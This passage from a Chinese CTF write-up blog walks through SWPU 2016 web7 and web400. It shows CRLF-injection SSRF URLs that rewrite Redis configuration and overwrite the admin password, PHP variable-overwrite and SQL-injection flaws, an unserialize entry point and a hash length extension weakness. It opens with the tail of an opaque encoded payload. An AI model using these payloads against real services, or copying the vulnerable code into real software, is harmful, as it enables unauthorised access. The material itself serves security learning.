class="hljs-number">006</span>=<span class="hljs-number">00</span>e=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>l=<span class="hljs-number">00s</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>W=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">000</span>=<span class="hljs-number">004</span>=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>Y=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>F=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>C=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>K=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>f=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>e=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>N=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>W=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">003</span>=<span class="hljs-number">001</span>=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>O=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>Y=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>Y=<span class="hljs-number">002</span>=<span class="hljs-number">00s</span>=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">003</span>=<span class="hljs-number">001</span>=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>w=<span class="hljs-number">00</span>O=<span class="hljs-number">000</span>=<span class="hljs-number">004</span>=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>f=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>B=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>N=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>L=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>R=<span class="hljs-number">004</span>=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>A=<span class="hljs-number">00s</span>=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>L=<span class="hljs-number">001</span>=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>R=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>w=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>v=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>o=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>C=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>F=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>N=<span class="hljs-number">000</span>=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>q=<span class="hljs-number">00</span>P=<span class="hljs-number">00</span>c=<span class="hljs-number">004</span>=<span class="hljs-number">00</span>H=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>K=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>B=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>p=<span class="hljs-number">00</span>Q=<span class="hljs-number">00s</span>=<span class="hljs-number">00</span>r=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>y=<span class="hljs-number">004</span>=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>L=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>R=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D</code></pre>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42585535/article/details/130838709">[GFCTF2021]文件查看器复现</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/134955296">[GFCTF 2021]文件查看器</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/aninock/p/16612452.html">GFCTF 2021]文件查看器</a></p>
<h1 id="swpu-2016web7">[SWPU 2016]web7</h1>
<pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python </span>
<span class="hljs-comment"># coding:utf8</span>

__author__ = <span class="hljs-string">'niexinming'</span>

<span class="hljs-keyword">import</span> cherrypy
<span class="hljs-keyword">import</span> urllib2
<span class="hljs-keyword">import</span> redis

<span class="hljs-keyword">class</span> <span class="hljs-title class_">web7</span>:
<span class="hljs-meta">    @cherrypy.expose</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">"&lt;script&gt; window.location.href='/input';&lt;/script&gt;"</span>
<span class="hljs-meta">    @cherrypy.expose</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">input</span>(<span class="hljs-params">self,url=<span class="hljs-string">""</span>,submit=<span class="hljs-string">""</span></span>):
        file=<span class="hljs-built_in">open</span>(<span class="hljs-string">"index.html"</span>,<span class="hljs-string">"r"</span>).read()
        reheaders=<span class="hljs-string">""</span>
        <span class="hljs-keyword">if</span> cherrypy.request.method==<span class="hljs-string">"GET"</span>:
            reheaders=<span class="hljs-string">""</span>
        <span class="hljs-keyword">else</span>:
            url=cherrypy.request.params[<span class="hljs-string">"url"</span>]
            submit=cherrypy.request.params[<span class="hljs-string">"submit"</span>]
            <span class="hljs-keyword">try</span>:
                <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> urllib2.urlopen(url).info().headers:
                    reheaders=reheaders+x+<span class="hljs-string">"&lt;br&gt;"</span>
            <span class="hljs-keyword">except</span> Exception,e:
                reheaders=<span class="hljs-string">"错误"</span>+<span class="hljs-built_in">str</span>(e)
            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> urllib2.urlopen(url).info().headers:
                reheaders=reheaders+x+<span class="hljs-string">"&lt;br&gt;"</span>
        file=file.replace(<span class="hljs-string">"&lt;?response?&gt;"</span>,reheaders)
        <span class="hljs-keyword">return</span> file
<span class="hljs-meta">    @cherrypy.expose</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self,password=<span class="hljs-string">""</span>,submit=<span class="hljs-string">""</span></span>):
        pool = redis.ConnectionPool(host=<span class="hljs-string">'127.0.0.1'</span>, port=<span class="hljs-number">6379</span>)
        r = redis.Redis(connection_pool=pool)
        re=<span class="hljs-string">""</span>
        file=<span class="hljs-built_in">open</span>(<span class="hljs-string">"login.html"</span>,<span class="hljs-string">"r"</span>).read()
        <span class="hljs-keyword">if</span> cherrypy.request.method==<span class="hljs-string">"GET"</span>:
            re=<span class="hljs-string">""</span>
        <span class="hljs-keyword">else</span>:
            password=cherrypy.request.params[<span class="hljs-string">"password"</span>]
            submit=cherrypy.request.params[<span class="hljs-string">"submit"</span>]
            <span class="hljs-keyword">if</span> r.get(<span class="hljs-string">"admin"</span>)==password:
                re=<span class="hljs-built_in">open</span>(<span class="hljs-string">"flag"</span>,<span class="hljs-string">'r'</span>).readline()
            <span class="hljs-keyword">else</span>:
                re=<span class="hljs-string">"Can't find admin:"</span>+password+<span class="hljs-string">",fast fast fast....."</span>
        file=file.replace(<span class="hljs-string">"&lt;?response?&gt;"</span>,re)
        <span class="hljs-keyword">return</span> file
cherrypy.config.update({<span class="hljs-string">'server.socket_host'</span>: <span class="hljs-string">'0.0.0.0'</span>,
                        <span class="hljs-string">'server.socket_port'</span>: <span class="hljs-number">8080</span>,
                       })
cherrypy.quickstart(web7(),<span class="hljs-string">'/'</span>)</code></pre>
<p>代码逻辑也不难理解，首先是对input页面的处理他会提取到输入框中的url参数内容，接着调用urllib2模块打开url，获取响应的头部信息，并返回页面中。</p>
<p>其次是对login页面的处理，他获取输入框中的password参数内容，接着连接redis数据库，将该数据库中admin键所对应的值与password内容比较，如果相等，则回显flag。</p>
<p>也就是说，我们需要想办法获取到redis中admin的值。这里我当时还以为用ssrf常规打redis的思路，直接gopher协议干，但试下来没啥效果，似乎只能以http来开头。随后看了wp发现不在自己知识存储范围内：</p>
<p>这道题对我来说依旧是新知识：python的urllib2的http头部注入</p>
<p>我们以redis数据库为例，当存在SSRF时我们伪造以下请求</p>
<pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1%</span><span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aCONFIG%<span class="hljs-number">20S</span>ET%<span class="hljs-number">20</span>dir%<span class="hljs-number">20%</span><span class="hljs-number">2</span>ftmp%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aCONFIG%<span class="hljs-number">20S</span>ET%<span class="hljs-number">20</span>dbfilename%<span class="hljs-number">20</span>evil%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a:<span class="hljs-number">6379</span>/foo</code></pre>
<p>解码一下，执行过程就是将修改Redis的工作目录为 <code>/tmp</code>，然后修改Redis的数据库文件名为 evil，路径为默认端口的<code>/foo</code></p>
<pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
CONFIG SET dir /tmp
CONFIG SET dbfilename evil
:<span class="hljs-number">6379</span>/foo</code></pre>
<p>然后就可以执行相关操作，比如修改用户的密码。再次利用ssrf漏洞进行修改并保存</p>
<pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1%</span><span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">20</span>admin%<span class="hljs-number">20</span>admin%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>asave%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a:<span class="hljs-number">6379</span>/foo</code></pre>
<p>解码结果如下</p>
<pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
set admin admin
save
:<span class="hljs-number">6379</span>/foo</code></pre>
<p>有了上面的知识，我们直接修改redis数据库的密码就行了</p>
<pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1%</span><span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">20</span>admin%<span class="hljs-number">20</span>admin%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>asave%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a:<span class="hljs-number">6379</span>/foo
//这里建议一直点击发送，然后发送完，赶紧输入admin密码登录</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315103831829.png" alt="image-20240315103831829"></p>
<p>具体漏洞原理，我认为可参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12387?time__1311=mqmhD57KAKGIzDBqDTeeqBKMjhvdPwqx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">CRLF injection</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/135097078">urllib2 HTTP头部注入</a></p>
<h1 id="swpu-2016web400">[SWPU 2016]web400</h1>
<p>这道题我是在找不到源码泄露的地方。。。只能看wp，cp一下了</p>
<pre><code class="hljs php"><span class="hljs-comment">//common.php</span>
<span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">"_POST"</span>,<span class="hljs-string">"_GET"</span>,<span class="hljs-string">"_COOKIE"</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>){
    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$$key</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$v</span>)){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"hello,hacker!"</span>);
        }
        <span class="hljs-keyword">else</span>{
            <span class="hljs-variable">$k</span>[<span class="hljs-number">0</span>] !=<span class="hljs-string">'_'</span>?<span class="hljs-variable">$$k</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$v</span>):<span class="hljs-variable">$$k</span> = <span class="hljs-string">""</span>;
        }
    }
}</code></pre>
<p>这里看到$$配合foreach可以想到变量覆盖，这里test一下看看覆盖逻辑</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">"_POST"</span>,<span class="hljs-string">"_GET"</span>,<span class="hljs-string">"_COOKIE"</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>){
    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$$key</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$v</span>)){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"hello,hacker!"</span>);
        }
        <span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$k</span>[<span class="hljs-number">0</span>].<span class="hljs-string">"\n"</span>;
            <span class="hljs-variable">$k</span>[<span class="hljs-number">0</span>] !=<span class="hljs-string">'_'</span>?<span class="hljs-variable">$$k</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$v</span>):<span class="hljs-variable">$$k</span> = <span class="hljs-string">""</span>;
        }
    }
}

<span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"\n"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;</code></pre>
<p>当我们输入以上代码的时候，我们get传参一下，如下图</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315114631730.png" alt="image-20240315114631730"></p>
<p>可以看到已经初始化的a变量没有被覆盖，而b未初始化，但被覆盖（但光靠想我想不出来为何a没有被覆盖）</p>
<pre><code class="hljs php"><span class="hljs-comment">//riji.php</span>
<span class="hljs-keyword">require_once</span>(<span class="hljs-string">"common.php"</span>);
<span class="hljs-title function_ invoke__">session_start</span>();

<span class="hljs-keyword">if</span> (@<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'login'</span>] !== <span class="hljs-number">1</span>)  <span class="hljs-comment">//检测登陆，没登陆就没有然后了</span>
{
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Location:/web/index.php'</span>);
    <span class="hljs-keyword">exit</span>();
}
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'user'</span>])
{
    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'user'</span>];
    @<span class="hljs-title function_ invoke__">mysql_conn</span>();
    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from user where name='<span class="hljs-subst">$username</span>'"</span>;
    <span class="hljs-variable">$result</span> = @<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>));  <span class="hljs-comment">//查询用户</span>
    <span class="hljs-title function_ invoke__">mysql_close</span>();
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">'userid'</span>])  <span class="hljs-comment">//用户不存在就不会执行下面的语句，id就不会初始化了</span>
    {
        <span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">'userid'</span>]);
    }
}
<span class="hljs-keyword">else</span>
{
    <span class="hljs-keyword">exit</span>();
}
<span class="hljs-meta">?&gt;</span>
<span class="hljs-comment">//中间省略部分html代码，下面是id关键代码</span>
<span class="hljs-meta">&lt;?php</span>
@<span class="hljs-title function_ invoke__">mysql_conn</span>();
<span class="hljs-variable">$sql1</span> = <span class="hljs-string">"select * from msg where userid= <span class="hljs-subst">$id</span> order by id"</span>;  <span class="hljs-comment">//id参数没有过滤</span>
<span class="hljs-variable">$query</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql1</span>);                                <span class="hljs-comment">//直接sql注入</span>
<span class="hljs-variable">$result1</span> = <span class="hljs-keyword">array</span>();
<span class="hljs-keyword">while</span>(<span class="hljs-variable">$temp</span>=<span class="hljs-title function_ invoke__">mysql_fetch_assoc</span>(<span class="hljs-variable">$query</span>)) {
    <span class="hljs-variable">$result1</span>[]=<span class="hljs-variable">$temp</span>;
}
<span class="hljs-title function_ invoke__">mysql_close</span>();
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$result1</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span>=&gt;<span class="hljs-variable">$o</span>)
{
    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">display</span>(<span class="hljs-variable">$o</span>[<span class="hljs-string">'msg'</span>]);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>上述代码会获取当前登录的用户名，然后进入数据库查询该用户的userid，并将其转换为整数</p>
<p>接着将得到的userid传入数据库在进行查询（但这个userid没有被过滤），获取到相应的结果。很明显这里的userid是不可控的，因为userid本身就在数据库中（已经被初始化），我们继续看代码，看是否能搞一些东西来控制他</p>
<p>在 api.php 中有 del_user 函数，可以删除用户，但是需要 userid 的值</p>
<pre><code class="hljs php"><span class="hljs-comment">//api.php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del_user</span>(<span class="hljs-params"></span>)</span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;userid){  <span class="hljs-comment">//需要userid信息才行</span>
        <span class="hljs-variable">$user_id</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$this</span>-&gt;userid);<span class="hljs-comment">//防注入</span>
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user_id</span> == <span class="hljs-number">1</span>){
            <span class="hljs-keyword">echo</span>(<span class="hljs-string">'&lt;script&gt;alert("Admin can\'t delete!!")&lt;/script&gt;'</span>);
            <span class="hljs-keyword">exit</span>();
        }
        @<span class="hljs-title function_ invoke__">mysql_conn</span>();
        <span class="hljs-variable">$sql2</span> = <span class="hljs-string">"DELETE FROM user where userid='<span class="hljs-subst">$user_id</span>'"</span>;
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql2</span>)){
            <span class="hljs-keyword">echo</span>(<span class="hljs-string">'&lt;script&gt;alert("Delete user success!!")&lt;/script&gt;'</span>);
            <span class="hljs-keyword">exit</span>();
        }
        <span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">echo</span>(<span class="hljs-string">'&lt;script&gt;alert("Delete user wrong!!")&lt;/script&gt;'</span>);
            <span class="hljs-keyword">exit</span>();
        }

        <span class="hljs-title function_ invoke__">mysql_close</span>();
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">echo</span>(<span class="hljs-string">'&lt;script&gt;alert("Check Your user_id!!")&lt;/script&gt;'</span>);
        <span class="hljs-keyword">exit</span>();
    }
}</code></pre>
<p>可以看到这里的del_user是一个删除用户的功能函数，先判断userid是否存在，然后转为整数，如果等于1，显示不能删除admin用户，如果不是1的话，我们就可以实现除admin之外任意用户的删除了</p>
<p>在 index.php 中可以找到 cookie 的拼接方法，cookie 里面就有 userid，base64 解一下就可以了</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$login</span>==<span class="hljs-number">1</span>)
{

    @<span class="hljs-title function_ invoke__">mysql_conn</span>();
    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from user where name='<span class="hljs-subst">$username</span>'"</span>;
    <span class="hljs-variable">$result</span> = @<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>));
    <span class="hljs-title function_ invoke__">mysql_close</span>();
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>))
    {

        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">'passwd'</span>] == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>))
        {
            <span class="hljs-variable">$user_cookie</span> = <span class="hljs-string">''</span>;
            <span class="hljs-variable">$user_cookie</span> .= <span class="hljs-variable">$result</span>[<span class="hljs-string">'userid'</span>];  <span class="hljs-comment">//user_cookie拼接方法，userid+name+salt</span>
            <span class="hljs-variable">$user_cookie</span> .= <span class="hljs-variable">$result</span>[<span class="hljs-string">'name'</span>];
            <span class="hljs-variable">$user_cookie</span> .= <span class="hljs-variable">$result</span>[<span class="hljs-string">'salt'</span>];
            <span class="hljs-variable">$cookies</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$user_cookie</span>);  <span class="hljs-comment">//拼接后base64编码就是cookie了</span>
            <span class="hljs-comment">//$cookies = $user_cookie;</span>
            <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">"user"</span>,<span class="hljs-variable">$cookies</span>,<span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">60</span>,<span class="hljs-string">'/web/'</span>);
            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'login'</span>] = <span class="hljs-number">1</span>;
            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'user'</span>] = <span class="hljs-variable">$username</span>;
            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Location:/web/riji.php'</span>);
        }
        <span class="hljs-keyword">else</span>
        {
            <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;script&gt;alert('Password Worng?')&lt;/script&gt;"</span>);
        }
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;script&gt;alert('Username Worng?')&lt;/script&gt;"</span>);
    }
}</code></pre>
<p>作者是登录页面的处理，如果用户名存在，且对应的密码也相等了，就能登录。但这里暴漏了cookie的拼接方法，就是纯明文拼接，接着base64加密。</p>
<p>下面我们就要利用api.php提供的接口函数，因为这个文件被当做公共库被包含，在api.php的最下面找到：</p>
<pre><code class="hljs scss"><span class="hljs-variable">$a</span> = <span class="hljs-built_in">unserialize</span>(base64_decode($api));
<span class="hljs-variable">$a</span>-&gt;<span class="hljs-built_in">do_method</span>();</code></pre>
<p>其中$api没有被初始化，所以这里我们就可以利用这个参数来控制admin这个类</p>
<p>del_user 函数使用前会调用 check 函数检测是否是 admin 用户，但是 check 函数存在 hash 拓展攻击，那么我们可以伪造一个 hash 实现 bypass</p>
<pre><code class="hljs php"><span class="hljs-comment">//api.php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>{
    <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$this</span>-&gt;name);  <span class="hljs-comment">//进入数据库的数据进行转义</span>
    @<span class="hljs-title function_ invoke__">mysql_conn</span>();
    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from user where name='<span class="hljs-subst">$username</span>'"</span>;
    <span class="hljs-variable">$result</span> = @<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>));
    <span class="hljs-title function_ invoke__">mysql_close</span>();
    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>)){
        <span class="hljs-comment">//利用 salt 验证是否为该用户</span>
        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;check === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">'salt'</span>] . <span class="hljs-variable">$this</span>-&gt;data . <span class="hljs-variable">$username</span>)){  <span class="hljs-comment">//这里存在hash拓展攻击</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">'(=-=)!!'</span>;
            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">'role'</span>] == <span class="hljs-number">1</span>){<span class="hljs-comment">//检查是否为admin用户</span>
                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
            }
            <span class="hljs-keyword">else</span>{
                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
            }
        }
        <span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
        }
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
}</code></pre>
<p>在 forget.php 中可以无条件获取任意用户加盐后的 hash，从而有了 hash 拓展攻击的原材料</p>
<pre><code class="hljs php"><span class="hljs-comment">//forget.php</span>
@<span class="hljs-title function_ invoke__">mysql_conn</span>();
<span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from user where name='<span class="hljs-subst">$username</span>'"</span>;
